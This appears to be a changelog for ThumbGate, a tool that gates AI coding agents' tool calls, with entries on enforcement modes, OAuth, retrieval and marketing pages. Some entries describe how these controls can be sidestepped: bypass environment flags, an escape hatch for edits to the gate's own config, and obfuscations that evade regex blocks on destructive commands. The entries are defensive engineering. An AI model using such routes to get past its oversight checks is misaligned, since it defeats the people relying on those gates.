- [#2469](https://github.com/IgorGanapolsky/ThumbGate/pull/2469) [`0e00194`](https://github.com/IgorGanapolsky/ThumbGate/commit/0e001941b84d1dccb1ee2b249534c757013478c5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix Playwright E2E: `dashboard-page-clickability` expected `'Gemini API key configured'` but the Perplexity-hybrid dashboard reworded the success banner to `'✓ Key validated. Hybrid (Perplexity/Gemini) supported for chat with your data.'` Test now matches the stable `'Key validated'` substring (with fallback to the old copy) so future banner tweaks don't break it. Unblocks PR [#2463](https://github.com/IgorGanapolsky/ThumbGate/issues/2463) + [#2464](https://github.com/IgorGanapolsky/ThumbGate/issues/2464) from the pre-existing E2E failure on main.

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`cb824a6`](https://github.com/IgorGanapolsky/ThumbGate/commit/cb824a660e4a7db2e48d8b65ba5358b598b4cd96) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix Codex CI blockers by restoring the literal Local Pro dashboard bootstrap message and replacing risky `gh api` PR-create regex detection with bounded token parsing.

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`cb824a6`](https://github.com/IgorGanapolsky/ThumbGate/commit/cb824a660e4a7db2e48d8b65ba5358b598b4cd96) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a non-blocking Gitar review pilot configuration: ThumbGate-specific `.gitar/review/` rules, an approval policy that prevents Gitar-only auto-approval on high-risk surfaces, a pilot runbook, and regression tests that keep the review-to-ThumbGate lesson loop documented.

- [#2468](https://github.com/IgorGanapolsky/ThumbGate/pull/2468) [`f46d76b`](https://github.com/IgorGanapolsky/ThumbGate/commit/f46d76b574287cb3b55add4fbd999ddfa533df41) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - content(seo): add /guides/govern-claude-for-legal-agents

  Buyer-intent guide riding Anthropic's "Claude for Legal has 90+ agents" launch.
  Positions ThumbGate as the governance layer that gates those agents' side effects
  (send/file/write) at the tool-call boundary, in the firm's own tenant, with a
  SIEM-exportable audit trail. Complementary framing (governs, does not replace);
  no overclaim (design-partner pilot, not turnkey). Server-rendered via seo-gsd
  spec; linked from the landing compare-guides section.

- [#2488](https://github.com/IgorGanapolsky/ThumbGate/pull/2488) [`9b1f7d3`](https://github.com/IgorGanapolsky/ThumbGate/commit/9b1f7d3c37ddaf1050f88d397068d782f754a7d0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - site: landing-page plan clarity + retire Team from the primary buyer surfaces (Free / Pro / Enterprise)

  The landing page made buyers infer plan differences from long cards, still sold a
  retired Team tier, and the README contradicted the enforced free-tier limits.

  - **Landing page comparison matrix** — adds an at-a-glance Free / Pro / Enterprise
    table to `public/index.html` so buyers see plan differences without parsing cards.
  - **Free / Pro / Enterprise** — retires the Team tier across the primary buyer
    surfaces (landing page, `/pricing`, guide, compare, pro, README, COMMERCIAL_TRUTH,
    product-hunt kit, docs landing) and the CLI/dashboard upgrade messaging
    (`commercial-offer`, `rate-limiter`, `pro-features`, `org-dashboard`). "Regulated"
    folds into the Enterprise contact-sales tier (audit trail, VPC/SSO, regulatory
    templates + shared lesson DB / org dashboard / shared enforcement).
  - **Consistent, truthful free-tier limits** — README/cards/matrix now all state what
    `scripts/rate-limiter.js` actually enforces (5 captures/day, 25 total, 3 active
    rules), replacing stale "unlimited captures / 5 rules" copy.
  - **Drift guards** — `check-congruence` now requires Enterprise + forbids the retired
    `$49/seat` anchor on buyer surfaces (regex tightened to catch markup-split prices);
    a new `public-landing` test pins the matrix + enforced free-tier numbers.

  Deliberately scoped: the dormant Team Stripe price ID / seat-checkout plumbing
  (`billing.js`, `metered-billing.js`) and a long tail of deep content pages
  (`public/guides/*`, `public/learn/*`, `llm-context.md`, `compare/agentix-labs.html`)
  still reference Team and are a separate follow-up — they are invisible to the primary
  pricing flow and do not break CI.

- [#2489](https://github.com/IgorGanapolsky/ThumbGate/pull/2489) [`204f084`](https://github.com/IgorGanapolsky/ThumbGate/commit/204f084bb97cf564fc6c2a4f80fa7f36de408e92) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Move the Enterprise dashboard chatbot away from Dialogflow-first framing to a local/open-source Governed Data Chat path. `/v1/chat` now accepts `THUMBGATE_LOCAL_LLM_ENDPOINT` / `THUMBGATE_LOCAL_LLM_MODEL` for OpenAI-compatible local models, augments lesson retrieval with optional LanceDB vector matches, and exposes `/v1/enterprise/data-chat/*` as the primary enterprise status/chat API while retaining legacy `/dialogflow/*` aliases.

- [#2494](https://github.com/IgorGanapolsky/ThumbGate/pull/2494) [`1f3622f`](https://github.com/IgorGanapolsky/ThumbGate/commit/1f3622f12c87d4d3021b53e7db7ab7cbb6304a61) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - gtm: OSS PR opportunity scout now covers the MCP ecosystem (our [#1](https://github.com/IgorGanapolsky/ThumbGate/issues/1) community)

  The scout mapped only npm dependencies to upstream repos, so it structurally
  missed the Model Context Protocol — even though ThumbGate _is_ an MCP server and
  MCP authors are its exact buyers. Added a strategic-ecosystem path that always
  scouts `modelcontextprotocol/typescript-sdk` and `modelcontextprotocol/servers`
  (de-duped against package.json), scores them as a top opportunity, and uses a
  truthful outreach line ("building ThumbGate as an MCP server") instead of falsely
  claiming we import the SDK. Regenerated the committed opportunity plan.

- [#2455](https://github.com/IgorGanapolsky/ThumbGate/pull/2455) [`3425330`](https://github.com/IgorGanapolsky/ThumbGate/commit/3425330f5287e17869fb3ef44c53e38c656f11c2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Surface the Enterprise tier on the pricing page. The README + adapters/gcp already promise Enterprise (Vertex AI / VPC gating, regulatory gate templates, audit export, SLA) but pricing.html only showed Free/Pro/Team. Adds a full-width Enterprise contact-sales band below the three self-serve tiers (layout-safe). Copy is scoped to what ships — Vertex routing via `npx thumbgate setup-vertex` — and deliberately does not claim a live Dialogflow CX agent.

- [#2460](https://github.com/IgorGanapolsky/ThumbGate/pull/2460) [`96650c4`](https://github.com/IgorGanapolsky/ThumbGate/commit/96650c47d99adf60eb7ee656d489b79c8c4be05d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(gates): rebaseGlobsToRepoRoot handles repoPath with a trailing slash

  `rebaseGlobsToRepoRoot` used `normalizePosix(repoPath)`, which preserved a
  trailing slash and produced malformed rebased globs (e.g. `repo//**`) when a
  task scope was set with a `repoPath` ending in `/`. Switched to
  `normalizeGlob(repoPath)` so task-scope edit-boundary globs resolve correctly
  regardless of trailing slash. (Addresses the edge case flagged on [#2454](https://github.com/IgorGanapolsky/ThumbGate/issues/2454).)

- [#2477](https://github.com/IgorGanapolsky/ThumbGate/pull/2477) [`e47a36b`](https://github.com/IgorGanapolsky/ThumbGate/commit/e47a36ba983a7dcfb4e324e691d2367c66b5247b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(enforcement): restore the firewall — warn+audit by default, strict opt-in for hard-block

  The 2026-06-03 hotfix bypassed ALL enforcement by default (gate-check approved every
  action, shipped to npm), so the firewall never fired. Restored with an honest posture
  (CEO decision 2026-06-04):

  - `bin/cli.js`: the blanket bypass is now an explicit escape hatch only
    (`THUMBGATE_HOTFIX_BYPASS=1`); enforcement runs by default.
  - `gates-engine.js` `applyEnforcementPosture`: WARN + AUDIT by default — every gate still
    fires and is logged, but deny/approve downgrade to `warn` so legitimate work is never
    hard-blocked. We deliberately do NOT use a regex "catastrophic floor" to hard-block
    destructive commands: it is unwinnable (sudo / bash -c / find -exec / eval / base64|sh
    all evade it) and gives false confidence.
  - HARD enforcement is the explicit opt-in `THUMBGATE_STRICT_ENFORCEMENT=1`, which keeps the
    engine's FULL gate set — its high-risk-command gates catch prefixed/obfuscated forms
    (e.g. `sudo rm -rf /`) far better than any single regex.
  - Secret exfiltration and the security-vulnerability scan hard-deny on their own paths
    before this runs, so irreversible data-leak / supply-chain risks stay blocked regardless.

  Verified by real gate-check: default → `rm -rf /`, `sudo rm -rf /`, git-commit-mentioning-
  rm-rf all WARN (none hard-blocked); `THUMBGATE_STRICT_ENFORCEMENT=1` → `rm -rf /` AND
  `sudo rm -rf /` DENY; `THUMBGATE_HOTFIX_BYPASS=1` → approve. Suites: gates-engine 168/0,
  cli 93/0, enforcement-teeth 38/0.

- [#2470](https://github.com/IgorGanapolsky/ThumbGate/pull/2470) [`375f821`](https://github.com/IgorGanapolsky/ThumbGate/commit/375f82176265bf086ceb323313ed3a11503f0f67) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Stabilize the workflow sentinel branch-contract path and make IDE marketplace publishing skip external publication when optional marketplace tokens are absent, while preserving packaged VSIX proof.

- [#2467](https://github.com/IgorGanapolsky/ThumbGate/pull/2467) [`1904f32`](https://github.com/IgorGanapolsky/ThumbGate/commit/1904f32e0e1a534851974c2d44f8a0c53c1c6a78) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - skill: add thumbgate-brand-voice authoring skill

  Repo-internal skill (not bundled to npm) that makes ThumbGate-facing copy
  on-brand: direct, technical, honest, anti-hype. Adapts the contrast-based
  "Claude brand skill" method (good / too-far / too-flat rewrites) into
  brand-foundation, voice-and-tone, content-formats, and a SKILL.md orchestrator.
  Codifies the no-overclaim rule and the "mistakes not malice" reframe so social,
  landing, README, and outreach copy stop sounding generic.

## 1.27.1

### Patch Changes

- a6cd753: Fix tool-level lockout loop by excluding automated gate blocks/warnings from negative feedback counts and ensuring only negative signal entries from attributed feedback are processed.

## 1.27.0

### Minor Changes

- [#2429](https://github.com/IgorGanapolsky/ThumbGate/pull/2429) [`7250e74`](https://github.com/IgorGanapolsky/ThumbGate/commit/7250e74c5353cd9611aaba09b5951b13f41bfb05) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `thumbgate brain` — build an agent-readable "context brain" for your repo.

  `npx thumbgate brain [--write] [--json] [--limit=N]` consolidates ThumbGate's institutional memory — captured lessons, prevention rules, active gates, and the project's agent-instruction files — into a single, **deterministic**, versioned artifact a coding agent should read _before_ acting. `--write` saves it to `.thumbgate/BRAIN.md` (commit it; point `CLAUDE.md`/`AGENTS.md` at it so every Claude Code, Codex, Cursor, or Gemini CLI session boots with the repo's memory loaded). Composes the existing `explore-subcommands` primitives — no new runtime dependencies. Registered in the command schema and `help all`; covered by 4 new CLI tests. Also adds a README "Context Brain" section and an AEO article (`docs/articles/context-brain-for-coding-agents.md`).

- [#2449](https://github.com/IgorGanapolsky/ThumbGate/pull/2449) [`9798ac2`](https://github.com/IgorGanapolsky/ThumbGate/commit/9798ac2b424e7d42d70d37b672ac2daf077535b0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add **"Chat with your data"** to the local dashboard. A new chat panel lets you ask natural-language questions about this install's captured ThumbGate data — your lessons, mistakes, and prevention rules — and get answers grounded _only_ in your retrieved data (RAG), with cited sources.

  - New `scripts/dashboard-chat.js`: retrieves the most relevant lessons for the question and asks Gemini to answer using only that context (no hallucinated facts; cites lesson numbers).
  - New `POST /v1/chat` endpoint in the API server.
  - Chat panel in `public/dashboard.html` (input + cited answers).
  - Enabled by `GEMINI_API_KEY` (`npx thumbgate setup-vertex --write`); degrades to a clear "configure your key" message when unset. This is the in-product enterprise "chat with your governed data" experience.

- [#2419](https://github.com/IgorGanapolsky/ThumbGate/pull/2419) [`2827e56`](https://github.com/IgorGanapolsky/ThumbGate/commit/2827e5643b083da07cfc1a9af3bc496b954e3281) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `thumbgate feedback-self-test` and the `thumbgate dogfood` alias to prove feedback capture is wired before agents claim thumbs signals are being stored.

  The command captures a synthetic thumbs signal, verifies both `feedback-log.jsonl` and `memory-log.jsonl`, uses an isolated test store by default, and supports `--persist` when intentionally dogfooding the active project store. The Codex onboarding prompt now points first-time users to this short proof command instead of a long multi-flag capture example.

- [#2407](https://github.com/IgorGanapolsky/ThumbGate/pull/2407) [`2c1e43e`](https://github.com/IgorGanapolsky/ThumbGate/commit/2c1e43e8f2bd3294b4437b84389d07b10da5057f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Make the MCP OAuth flow actually authenticate, and add a read-only reviewer credential.

  Previously the consent-screen `api_key` was stored as the token's bound key but never
  validated, so any client completing dynamic registration + PKCE received a working token
  and could execute `/mcp` tools (including write tools) against shared server state.

  - **Authorize now validates the key.** When ThumbGate keys are configured (production),
    the consent key must match a configured admin / operator / reviewer key, or the
    request is rejected (`access_denied`). In insecure/dev mode (no keys configured) any
    non-empty key is still accepted, preserving local development.
  - **`THUMBGATE_REVIEWER_KEY`** — a dedicated, independently-revocable, **read-only**
    credential. Tokens bound to it may only invoke `readOnlyHint: true` tools; write tools
    return an error. Safe to share with a directory reviewer without granting mutation
    rights or exposing the operator key.

- [#2392](https://github.com/IgorGanapolsky/ThumbGate/pull/2392) [`1f3d174`](https://github.com/IgorGanapolsky/ThumbGate/commit/1f3d1743b54add309d6aeb32267956bf9be09604) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - OAuth 2.1 (PKCE) for the remote MCP connector — full, tested flow + authenticated tool execution.

  The Claude Connectors Directory requires OAuth 2.0 for authenticated services, and
  the hosted /mcp endpoint was previously discovery-only (it listed tools but executed
  none, returning -32601). This adds the complete authorization flow AND wires
  authenticated tool execution over HTTP.

  - `scripts/mcp-oauth.js` — RFC 9728/8414 metadata, RFC 7591 dynamic client
    registration, RFC 7636 PKCE-S256 auth-code grant, RFC 8707 resource-indicator +
    token audience validation, token issue/validate with TTLs. 11 unit tests.
  - `src/api/server.js` — serves the two discovery docs and the `/oauth/register`,
    `/oauth/authorize` (consent + code), `/oauth/token` endpoints; executes authenticated
    `tools/call` (via the shared stdio `callTool`); 401s unauthenticated calls with a
    RFC 9728 `WWW-Authenticate` pointing at the protected-resource metadata. Auth accepts
    an audience-bound OAuth token OR an exact operator/admin key (never "any bearer").
  - End-to-end test (`tests/mcp-oauth-flow.test.js`): register → authorize → token →
    authenticated tools/call returning a real result; garbage token → 401. Passing.

  KNOWN LIMITATION (tracked, not in this PR): `callTool` runs on the server's local
  feedback DB, so the hosted connector is single-tenant. Production needs per-user data
  scoping keyed to the OAuth-bound key.

- [#2388](https://github.com/IgorGanapolsky/ThumbGate/pull/2388) [`6c92c35`](https://github.com/IgorGanapolsky/ThumbGate/commit/6c92c3582fce287fffea066646cc2fdacac819ac) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Trustworthy revenue predictions: Bayesian credible intervals on the forecast.

  `predictive-insights` previously emitted a point revenue forecast plus an ad-hoc
  confidence heuristic (`log1p(sampleVolume)/log1p(40)`) — a number you couldn't
  defend to a buyer. It now also emits a **Bayesian beta-binomial credible range**
  (reusing the existing `scripts/conversion-rate-stats.js` posterior), so the forecast
  is honest about uncertainty: with little funnel data the interval is wide; as N grows
  it tightens toward the empirical rate.

  `revenueForecast` gains (purely additive — the existing `predictedBookedRevenueCents`,
  `confidence`, and `band` are unchanged, so dashboards/tests keep working):

  - `range: { lowCents, expectedCents, highCents }` — booked-revenue at the 90% credible bounds.
  - `rateCredibleInterval: { lower, expected, upper, level, basis, sampleSize }` — the
    posterior interval on the conversion rate and which funnel path it used
    (checkout→paid when checkout data exists, else visitor→paid).
  - `statisticalConfidence` — `1 − intervalWidth`, a data-grounded confidence (narrower
    interval ⇒ higher confidence) distinct from the legacy heuristic.

  New `revenueCredibleRange()` export. Degrades to a point estimate if the stats layer
  errors — never throws into the forecast.

- [#2380](https://github.com/IgorGanapolsky/ThumbGate/pull/2380) [`94728d2`](https://github.com/IgorGanapolsky/ThumbGate/commit/94728d2270d9ef8188a9b3b50f591559a3ebf848) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Real semantic RAG in the per-action gating hot path.

  The "learn from the past" core is now literally semantic. Previously the per-action
  lesson retrieval that gates tool calls was _commented_ "semantically-relevant" but
  ran purely lexical scoring (token overlap + bigram Jaccard + BM25); the embedding /
  LanceDB vector store existed only for storage. The async gate path (`runAsync`) now
  uses **hybrid dense + sparse retrieval**: lexical ranking ⊕ embedding-similarity
  ranking → Reciprocal Rank Fusion (k=60) → existing cross-encoder rerank → top-K.

  This surfaces past mistakes that share no keywords with the current action
  (paraphrase / synonym / different file path) — recall lexical matching cannot give —
  so agents are warned about semantically-related failures before executing.

  - New `scripts/lesson-embedding-index.js`: cached dense index (vectors keyed by
    `id + sha256(text)`, persisted to `lesson-embeddings.json`; only the query is embedded
    per call, only new/changed lessons re-embed). Reuses `vector-store.embed`
    (Gemini → local transformers → stub) — no new dependency.
  - New `retrieveRelevantLessonsAsync` + `reciprocalRankFusion` in `scripts/lesson-retrieval.js`.
  - `gates-engine` gains `buildRelevantLessonContextAsync`, wired into `runAsync`.
  - Honest degradation: when no real embedder is available (or embedding errors), the
    path returns the identical pure-lexical result. No fabricated vectors, no regression
    to the synchronous `run()` path.

- [#2289](https://github.com/IgorGanapolsky/ThumbGate/pull/2289) [`b5a26ae`](https://github.com/IgorGanapolsky/ThumbGate/commit/b5a26ae25349f41c31045d94b5232fb9574219d7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(ul): silent-failure clustering is now ON by default (was opt-in)

  The silent-failure clustering candidate source shipped behind
  `THUMBGATE_SILENT_FAILURE_CLUSTERING=1` in PR [#2285](https://github.com/IgorGanapolsky/ThumbGate/issues/2285). The whole point of
  that work was to cover the case where users don't manually give
  thumbs-down on failed tool calls — but leaving it opt-in meant the
  users who needed it most (the ones who never set environment variables)
  never got the benefit.

  Flipped to default-ON. Opt out via:

  - `THUMBGATE_SILENT_FAILURE_CLUSTERING=0` (or `false` / `off` / `no`)
  - `NODE_ENV=test` (auto-opted-out so test runs stay deterministic)

  Back-compat: users who already set `THUMBGATE_SILENT_FAILURE_CLUSTERING=1`
  remain enabled (no-op for them).

  Bounded-risk rationale: silent-failure candidates flow through the
  existing `meta-agent-loop.js` fp-rate eval — they cannot auto-promote
  to real gates without passing the same precision/recall thresholds as
  LLM-generated candidates. Turning the candidate funnel on by default
  expands what the eval considers; it does not bypass any guardrail.

  6 new tests in `tests/silent-failure-cluster.test.js` cover default-on,
  explicit opt-out, explicit opt-in back-compat, and NODE_ENV=test
  precedence. All 37 tests pass locally.

### Patch Changes

- [#2420](https://github.com/IgorGanapolsky/ThumbGate/pull/2420) [`f9451e5`](https://github.com/IgorGanapolsky/ThumbGate/commit/f9451e53b42c9d94001b014ebd3895910f10caab) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Action-loop instrumentation: surface repeat-attempt prevention, detect no-op/redundant actions, and pair tracked actions with their outcomes.

  Three pure public-shell intelligence modules (no Core dependency) wired into the existing gate/feedback/context pipeline:

  1. **repeat-metric** (`scripts/repeat-metric.js`) — exposes the "repeat-attempts blocked before execution" metric (the count of pre-action gate fires that stopped a tool call the agent had already been blocked on). Reads `gates-engine.loadStats()` and surfaces a `repeat` sub-key through `gate_stats` (MCP) and `/v1/dashboard` (HTTP) without disk writes. Mostly exposes data ThumbGate already collects.

  2. **noop-detect** (`scripts/noop-detect.js` + `detect_noop` tool) — hashes an action's pre/post state (file diff, command exit code + output hash) and flags when an action did not change state or is identical to a prior attempt in the session. Normalizes volatile fields (ISO timestamps, epoch ints, hex/uuid blobs, ANSI codes, trailing whitespace) and guards partial-write truncation. Plugs a `repeatSignal` flag into `track_action`.

  3. **action-receipts** (`scripts/action-receipts.js` + `record_action_receipt`/`get_action_receipts` tools) — pairs each tracked tool call with its result (diff / exit code / test outcome) so a promoted rule encodes "this action -> this outcome", not just a thumbs signal. Threads `pairFeedbackWithReceipt` into `capture_feedback`'s lesson pipeline and feeds receipt entries into `construct_context_pack`.

  Public bundle ratchet bumped 268 → 271 in lockstep across `tests/public-bundle-ratchet.test.js` and `tests/public-core-boundary.test.js` for the three new scripts.

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`9e6f1ce`](https://github.com/IgorGanapolsky/ThumbGate/commit/9e6f1ce5096471d11ba6e000e31cbe627cafdb9d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a public Agentic.ai ownership verification route so ThumbGate can be submitted to the Agentic.ai directory and measured with UTM-tagged referral traffic.

- [#2372](https://github.com/IgorGanapolsky/ThumbGate/pull/2372) [`3156075`](https://github.com/IgorGanapolsky/ThumbGate/commit/315607534758b2c30dcc3e31335f270dd29ee0ea) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - site: /ai-malpractice-prevention — two updates from the GT call

  1. **New hero callout for BigLaw firms without a public-facing chatbot.** Most BigLaw doesn't take intake through a chatbot, but associates already use Claude/Cursor/Codex on real matters. The relevant risk surface is internal AI use. ThumbGate produces a searchable audit log + RAG of every gated detection — queryable by ethics, risk, and innovation owners. Conflicts DB and document systems stay where they are; we instrument what the agents inside the firm are about to do.

  2. **Conflict Gate demo reframed.** Copy now makes explicit the gate queries the firm's existing conflicts DB (Intapp Open, IntelliPlan, Aderant, or custom) in production — not a vendor-hosted list. The sample list shown is illustrative only. Removes a procurement objection from buyers with 10k+ row adverse databases.

- [#2373](https://github.com/IgorGanapolsky/ThumbGate/pull/2373) [`f9a11b4`](https://github.com/IgorGanapolsky/ThumbGate/commit/f9a11b49b67369c2579138fde070cbb8c2b51c26) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - site: BigLaw conversion clarity — two pages, three new procurement-defensible blocks

  - `/ai-malpractice-prevention` recommended-pilot section now includes three color-coded blocks: "What you walk away with" (audit log + RAG of every gated detection), "What we don't claim" (pre-SOC2, no hallucination indemnity, local-first), "What you bring" (one owner, one workflow, your approved disclaimer, read-only conflicts DB access). Pre-empts procurement objections without overpromising.
  - `/compare/anthropic-claude-for-legal` hero now carries the same BigLaw-internal-AI callout the malpractice page added — anyone landing from the Claude-for-Legal comparison sees the no-public-chatbot framing without needing to navigate.

- [#2390](https://github.com/IgorGanapolsky/ThumbGate/pull/2390) [`c04d567`](https://github.com/IgorGanapolsky/ThumbGate/commit/c04d5679cd910548fbe779c771d1c6c8c32157e5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Make the Claude/MCP connector discoverable: fix the MCP Registry publish + document the remote connector.

  ThumbGate already runs as a working remote MCP server (https://thumbgate.ai/mcp),
  but it wasn't listed in the MCP Registry — the publish workflow had been failing.

  - `.github/workflows/mcp-registry-publish.yml`: bump `mcp-publisher` v1.5.0 → v1.7.9
    (v1.5.0 requested the old OIDC audience `mcp-registry`; the registry now requires
    `https://registry.modelcontextprotocol.io` and 401s the old one). Add a step that
    waits for the npm package version in `server.json` to be live on npmjs.org before
    publishing, so a release that bumps the version ahead of npm no longer 404s the
    registry publish.
  - README: add an "Add ThumbGate to Claude (remote connector)" section pointing at
    `https://thumbgate.ai/mcp` (Settings → Connectors → Add custom connector) — usable
    today with no install.

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`6bba5cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/6bba5cd7e93601135c475359d149272df4377c2c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Document the exact Codex Desktop marketplace modal fields for the ThumbGate plugin and explain why OpenAI-only filtering hides third-party marketplace entries.

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`f0be847`](https://github.com/IgorGanapolsky/ThumbGate/commit/f0be847dbd713ae1780ded9c1dca7be67251de34) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify the Codex plugin install UX: make CLI setup the primary path, label the release zip as a review/offline/manual marketplace artifact, and document the Codex Desktop plugin install caveat.

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`169b894`](https://github.com/IgorGanapolsky/ThumbGate/commit/169b8944885442518283eac2279d4946771edee5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Tighten the Codex plugin listing around the repeat-blocking thumbs-down workflow and keep CLI-first install guidance ahead of the portable zip bundle.

- [#2410](https://github.com/IgorGanapolsky/ThumbGate/pull/2410) [`a6a640b`](https://github.com/IgorGanapolsky/ThumbGate/commit/a6a640b9657f8d85e0653f89e4ccc32bf8b70d28) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(connector): resolve the two 404s blocking the Claude Connectors Directory submission

  - Add a `/docs/connectors` route — the `resource_documentation` URL advertised by `/.well-known/oauth-protected-resource`. It documents the remote MCP connect URL, the OAuth 2.1 (PKCE, S256-only, RFC 8707 audience-bound) flow, the available tool groups, and the read-only reviewer credential. Previously 404.
  - Add `public/favicon.ico` (4-size 16/32/48/64 ICO minted from the 512px brand icon). The `/favicon.ico` handler already served `PUBLIC_DIR/favicon.ico`; only the asset was missing. The directory requires favicon verification. `favicon.ico` is not in npm `files[]`, so the public-bundle-ratchet baseline is unchanged.

- [#2369](https://github.com/IgorGanapolsky/ThumbGate/pull/2369) [`b276d73`](https://github.com/IgorGanapolsky/ThumbGate/commit/b276d733fbec2536864361dfc626f0a2bd2f78b9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - site: /ai-malpractice-prevention live demos now ship one-click **Fill sample** buttons for each gate (UPL, Conflict, Egress) — one fires BLOCK, one fires CLEAR. UPL Gate copy corrected to clarify the input is an advice-shaped _response a bot would deliver_, not a _question from a client_. Each demo description now references the feedback-to-enforcement loop (capture 👍/👎 → memory → rule promotion → enforcement) so prospects see the loop, not just the endpoint.

- [#2371](https://github.com/IgorGanapolsky/ThumbGate/pull/2371) [`604c8c2`](https://github.com/IgorGanapolsky/ThumbGate/commit/604c8c2d886b514eebb5ee06bbd4defe8558cdaf) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - site: `/learn/feedback-loop-vs-decision-layer` — replaced wall-of-text 4-stage list with a visual loop diagram (Capture → Memory → Rule promotion → Enforcement → loop closes back to Capture). Diagram leads the section so scanners see the loop shape before reading prose. Mobile-responsive (stacks vertically with rotated arrows below 800px). Existing per-stage detail blocks preserved below the diagram for readers who want the full text.

- Fix tool-level lockout loop by excluding automated gate blocks/warnings from negative feedback counts and ensuring only negative signal entries from attributed feedback are processed.

- [#2446](https://github.com/IgorGanapolsky/ThumbGate/pull/2446) [`8a7d78c`](https://github.com/IgorGanapolsky/ThumbGate/commit/8a7d78cccb8c6dc11ab27dc3a378753db64538a2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix `knowledge-conflict-gate` hard-blocking unrelated work when memory is noisy. Previously, any action whose retrieved lessons had sentiment entropy > 0.7 returned `decision: 'deny'` — so a session with conflicting past lessons (e.g. lots of recent UpWork-touching memory) would block routine commands like `pip install`, `chmod`, and edits. Now the gate **warns by default** and only hard-blocks in opt-in strict mode (`THUMBGATE_STRICT_KNOWLEDGE_CONFLICT=1`) for genuinely destructive/external commands (`git push`, `npm publish`, `rm -rf`, deploys, …). Also adds a `permission-change-approval` exception for safe local credential-hardening (`chmod 600` on a key file). A governance gate must not turn noisy memory into a wall across all work.

  Also: (1) fixes a ReDoS (polynomial regex) in the chmod credential-hardening check by replacing the ambiguous-whitespace regex with a linear token scan; (2) adds a **gate escape hatch** — edits that only touch the gate's own config (`~/.claude/settings*.json`, `~/.thumbgate/*.json`) are never blocked by a task scope, so a stale/misconfigured scope can never trap the user inside the gate's own settings.

- [#2454](https://github.com/IgorGanapolsky/ThumbGate/pull/2454) [`6a21530`](https://github.com/IgorGanapolsky/ThumbGate/commit/6a2153016314c0f83b09151adac52678a156bb74) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Two pre-action gate fixes that were unblocking legitimate coding-agent work:

  1. **memory-high-risk gate exempts credential-hardening chmod** — `chmod 600` on a credential path (e.g. `~/.resume_secrets/key.json`, `~/.ssh/id_*`) is a hardening (safety) action. It was being hard-denied by `memory-high-risk-default-deny` when recurring negative memory matched. The `isSafeLocalCredentialHardeningCommand` exemption (already guarding the permission-change-approval gate) now also guards the memory gate.

  2. **task-scope rebases absolute allowedPaths to repo-relative** — affected files are compared repo-relative, so an absolute `allowedPath` silently never matched (no-op scope). `setTaskScope` now rebases absolute globs under `repoPath` to their repo-relative form; the repoPath itself collapses to `**`. Relative globs and globs outside repoPath are unchanged (monotonic — can't regress a working scope).

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`948f7bd`](https://github.com/IgorGanapolsky/ThumbGate/commit/948f7bd5d537835ecacda1f2f8505c8a9b9cc3dc) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix Codex CI blockers by restoring the literal Local Pro dashboard bootstrap message and replacing risky `gh api` PR-create regex detection with bounded token parsing.

- [#2431](https://github.com/IgorGanapolsky/ThumbGate/pull/2431) [`d4d365c`](https://github.com/IgorGanapolsky/ThumbGate/commit/d4d365c1265cce725ca0ba0b39483940e2fb48a6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Enterprise GCP / Dialogflow CX guardrails add-on (`adapters/gcp/`).

  - **DFCX webhook gate** — routes a Dialogflow CX fulfillment request through the pre-action gate engine (`evaluateGates`) plus same-session repeat detection before the side-effect (DB/CRM/billing) runs; returns allow or a safe block response.
  - **Cloud Run / Functions entrypoint** — drop-in proxy that forwards allowed turns to the customer's existing fulfillment URL.
  - **Vertex / Gemini scorer** — fetch-based (no SDK) client so ThumbGate scoring can run on Google models inside the customer's GCP tenant.
  - **Security hardening (all callers)** — `computeExecutableHash` in `gates-engine.js` no longer runs `which` through a shell; it uses `execFileSync('which', [cmd])` so a hostile `command` value can't inject shell metacharacters. Independent of the add-on; benefits every gate evaluation.

